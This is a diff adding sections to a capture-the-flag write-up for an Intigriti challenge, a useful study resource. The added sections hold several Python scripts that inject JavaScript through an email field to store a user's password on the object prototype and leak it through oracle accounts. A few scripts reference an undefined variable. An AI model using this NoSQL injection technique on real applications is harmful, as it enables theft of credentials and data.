@@ -4,7 +4,7 @@ date: 2023-01-23 10:43:37
 tags: [Security]
 categories: [Security]
 ---
-<img src="/img/intigriti-0123-second-order-injection/cover-en.png" style="display:none">
+<img src="/img/intigriti-0123-second-order-injection/cover-en.png" style="display:none" loading="lazy">
 
 As usual, there is a Intigriti challenge in January, but this time it's not an XSS challenge. It's about "second order injection" which is relatively uncommon, so I decided to write a blog post.
 
@@ -487,6 +487,589 @@ print(f"time: {time.time() - start}s, {req_count} requests")
 
 It takes 7s(-30%) and 185 requests(-36%).
 
-Can we go faster? Probably, I am looking forwatd to seeing a faster solution. Can we reduce the request? Absolutely!
+Can we go faster? Probably, I am looking forward to seeing a faster solution. Can we reduce the request? Absolutely!
 
 Since [sleep function](https://www.mongodb.com/docs/v4.2/reference/method/sleep/) is enabled, we can use it to introduce more states, and leak the flag in less requests theoretically, but need to wait much longer.
+
+## A faster solution
+
+After this writeup has been published, @antonio345 reach me on Discord, saying that he has an idea to make it faster.
+
+The idea is to "persist" the flag, here is one example:
+
+```js
+function search() {
+  return this.email === "anything@anything.com" || 
+    this.username == "PinkDraconian" && 
+    (() => {this.__proto__.flag = this.password;})() ||
+    this.flag=="INTIGRITI{Y0uD1d1T}" ? 
+      this.username == "username_true" : 
+      this.username == "username_false"
+    || ""
+}
+```
+
+When the search function meets `PinkDraconian`, it will store the password in `this.__proto__`. Then, we can get this password when this function is processing other accounts.
+
+For above, the return value is `username_true`, which prove that this works.
+
+I also thought about similar things before, but somehow not success. After having the ability to store the flag, we can reuse the "oracle" to get the flag with less requests:
+
+``` py
+import requests
+import json
+import concurrent.futures
+import string
+import time
+
+BASE_URL = 'https://challenge-0123.intigriti.io'
+LOGIN_URL = BASE_URL + '/login.html'
+EDIT_URL = BASE_URL + '/editor.html'
+QUERY_URL = BASE_URL + '/api/friends?q='
+
+SKIP_CREATE_ORACLE = 0
+MAX_WORKERS = 15
+charset = string.printable
+req_count = 0
+
+def create_oracle(c):
+  global req_count
+  session = requests.session()
+  session.post(LOGIN_URL, data={
+    "username": "account_oracle_" + c,
+    "password": "account_oracle_" + c,
+  })
+  req_count+=1
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+
+def leak_char(index):
+  global req_count
+  payload = 'anything@anything.com" || this.username=="PinkDraconian" && (() => {this.__proto__.flag = this.password;})() || this.flag && this.username == "account_oracle_"+this.flag[' + str(index) +'] || "'
+  session = requests.session()
+
+  name = "account_get_" + str(index)
+
+  session.post(LOGIN_URL, data={
+    "username": name,
+    "password": name
+  })
+  session.post(EDIT_URL, data={
+    "email": payload
+  })
+
+  resp = requests.get(QUERY_URL + name)
+  req_count+=3
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+    return '#'
+
+  if resp.text == 'null':
+    print('Failed')
+    return '#'
+
+  #print(resp.text)
+  data = json.loads(resp.text)
+  char = data["username"].replace('account_oracle_', '')
+  return char
+
+start = time.time()
+
+if SKIP_CREATE_ORACLE == False:
+  print("create oracle account...")
+  total = len(charset)
+  current = 0
+  with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+      futures = {executor.submit(create_oracle, c): c for c in charset}
+      for future in concurrent.futures.as_completed(futures):
+          current += 1
+          if current % 10 == 0 or current == total:
+            print(f"Progress: {current}/{total}")
+
+print("leaking flag")
+length = 19
+ans = [' '] * length
+with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+    futures = {executor.submit(leak_char, i): i for i in range(length)}
+    for future in concurrent.futures.as_completed(futures):
+        index = futures[future]
+        data = future.result()
+        ans[index] = data
+        print("".join(ans))
+
+print(f"time: {time.time() - start}s, {req_count} requests")
+```
+
+It takes 12s and 157 requests, we reduced 29 requests!
+
+## Can we make it less than 100 requests?
+
+156 requests is not that far from 100, it's promising to give it a try.
+
+Our solution consist of two phases, setup and leaking.
+
+For setup phase, we make 100 requests to cover all possible characters. Leaking one character takes 1 login request + 1 edit request + 1 search request, so it's 3 * 19 = 57 to leak the whole flag.
+
+Apparently, we send too much requests in setup phase.
+
+To make it less, we can use a new approach.
+
+Instead of creating 100 oracles, we create only 10 oracles(0-9). For every character, we leak twice, first time we leak `ASCII % 10`, second time leak `ASCII / 10`.
+
+`~` is the last printable character, it has ASCII code 126, and the first printable character is `!`, ASCII code 33.
+
+So, if we get the ASCII code of the flag and minus 27, it's guarantee that it has at most two digits.
+
+Assumed that the character we are leaking has ASCII code 68, it's 41 after miuns 27.
+
+The goal is to leak "4" for the first round and "1" for the second round.
+
+By using this new approach, the request is now 10(setup) + 6 * 19(leaking) = 124.
+
+Moreover, we don't need to create the account again for the second round, so it's 10 + 5 * 19 = 105 requests, very close to 100.
+
+``` py
+import requests
+import json
+import concurrent.futures
+import string
+import time
+
+BASE_URL = 'https://challenge-0123.intigriti.io'
+LOGIN_URL = BASE_URL + '/login.html'
+EDIT_URL = BASE_URL + '/editor.html'
+QUERY_URL = BASE_URL + '/api/friends?q='
+
+SKIP_CREATE_ORACLE = 0
+MAX_WORKERS = 15
+charset = string.digits
+req_count = 0
+
+def create_oracle(c):
+  global req_count
+  session = requests.session()
+  session.post(LOGIN_URL, data={
+    "username": "account_oracle_" + c,
+    "password": "account_oracle_" + c,
+  })
+  req_count+=1
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+
+def leak_char(index):
+  # leak 10a + b + 27 = ascii
+  global req_count
+  payload = 'anything@anything.com" || this.username=="PinkDraconian" && (() => {this.__proto__.flag = this.password;})() || this.flag && this.username == "account_oracle_" + (this.flag.charCodeAt(' + str(index) + ') - 27) % 10 || "'
+  session = requests.session()
+
+  name = "account_get_" + str(index)
+
+  session.post(LOGIN_URL, data={
+    "username": name,
+    "password": name
+  })
+  session.post(EDIT_URL, data={
+    "email": payload
+  })
+
+  resp = requests.get(QUERY_URL + name)
+  req_count+=3
+
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+    return '#'
+
+  if resp.text == 'null':
+    print('Failed')
+    return '#'
+
+  data = json.loads(resp.text)
+  b = data["username"].replace('account_oracle_', '')
+
+  # do it again to leak
+  payload = 'anything@anything.com" || this.username=="PinkDraconian" && (() => {this.__proto__.flag = this.password;})() || this.flag && this.username == "account_oracle_" + Math.floor((this.flag.charCodeAt(' + str(index) + ') - 27) / 10) || "'
+
+  session.post(EDIT_URL, data={
+    "email": payload
+  })
+
+  resp = requests.get(QUERY_URL + name)
+  req_count+=2
+
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+    return '#'
+
+  if resp.text == 'null':
+    print('Failed')
+    return '#'
+
+  data = json.loads(resp.text)
+  a = data["username"].replace('account_oracle_', '')
+  a = int(a)
+  b = int(b)
+
+  return chr(10*a + b + 27)
+
+start = time.time()
+
+if SKIP_CREATE_ORACLE == False:
+  print("create oracle account...")
+  total = len(charset)
+  current = 0
+  with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+      futures = {executor.submit(create_oracle, c): c for c in charset}
+      for future in concurrent.futures.as_completed(futures):
+          current += 1
+          if current % 10 == 0 or current == total:
+            print(f"Progress: {current}/{total}")
+
+print("leaking flag")
+length = 19
+ans = [' '] * length
+with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+    futures = {executor.submit(leak_char, i): i for i in range(length)}
+    for future in concurrent.futures.as_completed(futures):
+        index = futures[future]
+        data = future.result()
+        ans[index] = data
+        print("".join(ans))
+
+print(f"time: {time.time() - start}s, {req_count} requests")
+```
+
+If you look at the code carefully, you will find that we can reuse the `account_oracle_` session instead of creating a new one, so it's 105 - 10 = 95 requests now, finally reach our goal!
+
+I also refactored the JS part to make it more clear and readable. 
+
+``` py
+import requests
+import json
+import concurrent.futures
+import string
+import time
+
+BASE_URL = 'https://challenge-0123.intigriti.io'
+LOGIN_URL = BASE_URL + '/login.html'
+EDIT_URL = BASE_URL + '/editor.html'
+QUERY_URL = BASE_URL + '/api/friends?q='
+
+SKIP_CREATE_ORACLE = 0
+MAX_WORKERS = 15
+charset = string.digits
+req_count = 0
+stored_session = []
+
+def create_oracle(c):
+  global req_count
+  global stored_session
+  session = requests.session()
+  session.post(LOGIN_URL, data={
+    "username": "account_oracle_" + c,
+    "password": "account_oracle_" + c,
+  })
+  stored_session.append({
+    "session": session,
+    "name": "account_oracle_" + c
+  })
+  req_count+=1
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+
+def leak_char(index):
+  # leak 10a + b + 27 = ascii
+  global req_count
+  global stored_session
+  js_code = """
+  if (this.username == "PinkDraconian"){
+    this.__proto__.flag = this.password;
+  } else if (this.flag) {
+    if (CONDITION) {
+      return this.username == "account_oracle_" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10)
+    }
+
+    return this.username == "account_oracle_" +  (this.flag.charCodeAt(INDEX) - 27) % 10
+  }
+  """.replace("\n", "").replace('INDEX', str(index))
+
+  payload = 'anything@anything.com" || (() => {JS})() || "'.replace('JS', js_code)
+
+  session = requests.session()
+
+  if len(stored_session) > 0:
+    data = stored_session.pop()
+    session = data["session"]
+    name = data["name"]
+  else:
+    name = "account_get_" + str(index)
+
+    session.post(LOGIN_URL, data={
+      "username": name,
+      "password": name
+    })
+    req_count += 1
+
+  session.post(EDIT_URL, data={
+    "email": payload.replace("CONDITION", "false")
+  })
+
+  resp = requests.get(QUERY_URL + name)
+  req_count+=2
+
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+    return '#'
+
+  if resp.text == 'null':
+    print('Failed')
+    return '#'
+
+  data = json.loads(resp.text)
+  b = data["username"].replace('account_oracle_', '')
+
+  session.post(EDIT_URL, data={
+    "email": payload.replace("CONDITION", "true")
+  })
+  resp = requests.get(QUERY_URL + name)
+  req_count+=2
+
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+    return '#'
+
+  if resp.text == 'null':
+    print('Failed')
+    return '#'
+
+  data = json.loads(resp.text)
+  a = data["username"].replace('account_oracle_', '')
+  a = int(a)
+  b = int(b)
+
+  return chr(10*a + b + 27)
+
+start = time.time()
+
+print("create oracle account...")
+total = len(charset)
+current = 0
+with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+    futures = {executor.submit(create_oracle, c): c for c in charset}
+    for future in concurrent.futures.as_completed(futures):
+        current += 1
+        if current % 10 == 0 or current == total:
+          print(f"Progress: {current}/{total}")
+
+print("leaking flag")
+
+length = 19
+ans = [' '] * length
+with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+    futures = {executor.submit(leak_char, i): i for i in range(length)}
+    for future in concurrent.futures.as_completed(futures):
+        index = futures[future]
+        data = future.result()
+        ans[index] = data
+        print("".join(ans))
+
+print(f"time: {time.time() - start}s, {req_count} requests")
+```
+
+This version takes 7s and 95 requests.
+
+## Ultimate version
+
+For now, setup phase makes 10 requests and leaking phase makes 1 login + 2 update email + 2 search requests. 
+
+Can we still reduce the number of requests?
+
+Sure, if we apply the "state-persistent" technique again.
+
+Why do we need to make two requests for updating the email? Because we have two rounds, the leaking target is different bwteeen these two.
+
+Here is the idea, how about make our JS code state-dependent? If a special email is not exists, we leak first round, otherwise second round.
+
+The code is like this:
+
+``` js
+if (this.username == "PinkDraconian"){
+  this.__proto__.flag = this.password;
+} else if (this.flag) {
+  if (this.email == "SWITCH_EMAIL") {
+    this.__proto__.condition = 1;
+  }
+  if (this.condition) {
+    return this.username == "account_oracle_" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10)
+  }
+  return this.username == "account_oracle_" +  (this.flag.charCodeAt(INDEX) - 27) % 10
+}
+```
+
+At the beginning, `SWITCH_EMAIL` not exists, so `this.condition` is false. After we leak all the last digits, we update our email to `SWITCH_EMAIL` for the account we created earlier.
+
+Now, the `SWITCH_EMAIL` exists, `this.__proto__.condition` becomes `true`, which makes our JS payload return first digit without updating the code again.
+
+Also, we added some randomize for the account name and email to prevent  conflict.
+
+``` py
+import requests
+import json
+import concurrent.futures
+import string
+import time
+import random
+
+BASE_URL = 'https://challenge-0123.intigriti.io'
+LOGIN_URL = BASE_URL + '/login.html'
+EDIT_URL = BASE_URL + '/editor.html'
+QUERY_URL = BASE_URL + '/api/friends?q='
+
+FLAG_LENGTH = 19
+charset = "0123456789abcdefghi"
+req_count = 0
+stored_session = [' '] * FLAG_LENGTH
+
+# randomize the account to avoid conflict
+switch_email = "abc@abc.comm" + str(random.randint(0,999999))
+account_oracle = "account_oracle_" + str(random.randint(0,999999)) + "_"
+
+def create_oracle(index):
+  global req_count
+  global stored_session
+  c = charset[index]
+  session = requests.session()
+  session.post(LOGIN_URL, data={
+    "username": account_oracle + c,
+    "password": account_oracle + c,
+  })
+  req_count+=1
+
+  stored_session[index] = {
+    "session": session,
+    "name": account_oracle + c
+  }
+
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+
+def leak_char(round, index):
+  # leak 10a + b + 27 = ascii
+  # use 'this.email == "SWITCH_EMAIL"' to change state so that we don't need to update the payload
+  global req_count
+  global stored_session
+  js_code = """
+  if (this.username == "PinkDraconian"){
+    this.__proto__.flag = this.password;
+  } else if (this.flag) {
+    if (this.email == "SWITCH_EMAIL") {
+      this.__proto__.condition = 1;
+    }
+    if (this.condition) {
+      return this.username == "account_oracle_" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10)
+    }
+    return this.username == "account_oracle_" +  (this.flag.charCodeAt(INDEX) - 27) % 10
+  }
+  """.replace("\n", "").replace('INDEX', str(index)).replace("SWITCH_EMAIL", switch_email).replace("account_oracle_", account_oracle)
+
+  payload = 'anything@anything.com" || (() => {JS})() || "'.replace('JS', js_code)
+
+  session = requests.session()
+
+  data = stored_session[index]
+  session = data["session"]
+  name = data["name"]
+
+  # we only need to update the payload for first round
+  if round == 1:
+    session.post(EDIT_URL, data={
+      "email": payload.replace("condition", "condition"+str(random.randint(0,999999)))
+    })
+    req_count += 1
+
+  # for second round we don't need to update email
+  resp = requests.get(QUERY_URL + name)
+  req_count += 1
+
+  if resp.status_code != 200:
+    print(resp.status_code)
+    print(resp.text)
+    return '#'
+
+  if resp.text == 'null':
+    print('Failed')
+    return '#'
+
+  data = json.loads(resp.text)
+  num = data["username"].replace(account_oracle, '')
+
+  return num
+
+start = time.time()
+
+# create an account for our state
+session = requests.session()
+account_test_123 = "account_test_123" + str(random.randint(0,999999))
+session.post(LOGIN_URL, data={
+  "username": account_test_123,
+  "password": account_test_123,
+})
+req_count += 1
+
+print("create oracle account...")
+total = len(charset)
+current = 0
+with concurrent.futures.ThreadPoolExecutor(max_workers=FLAG_LENGTH) as executor:
+    futures = {executor.submit(create_oracle, i): i for i in range(total)}
+    for future in concurrent.futures.as_completed(futures):
+        current += 1
+        if current % 10 == 0 or current == total:
+          print(f"Progress: {current}/{total}")
+
+print("leaking flag first round")
+
+length = FLAG_LENGTH
+ans = [' '] * length
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=FLAG_LENGTH) as executor:
+    futures = {executor.submit(leak_char, 1, i): i for i in range(length)}
+    for future in concurrent.futures.as_completed(futures):
+        index = futures[future]
+        data = future.result()
+        ans[index] = data
+
+# we update the email to let our payload return another result
+print(switch_email)
+session.post(EDIT_URL, data={
+  "email": switch_email
+})
+req_count += 1
+
+print("leaking flag second round")
+print(ans)
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=FLAG_LENGTH) as executor:
+    futures = {executor.submit(leak_char, 2, i): i for i in range(length)}
+    for future in concurrent.futures.as_completed(futures):
+        index = futures[future]
+        data = future.result()
+        ans[index] = chr(int(data)*10 + int(ans[index]) + 27)
+        print("".join(ans))
+
+print(f"time: {time.time() - start}s, {req_count} requests")
+```
+
+For this ultimate solution, it takes 5.3s and 19 + 2 + 3 * 19 = 78 requests!
+
+Compared to my previous solution which makes 185 requests, we reduced the number by half, what a big progress!
+
+Again, credits to @antonio345 who offers the initial idea and also the POC, we discussed and improved the code together. It's fun to see how far we can go.
+
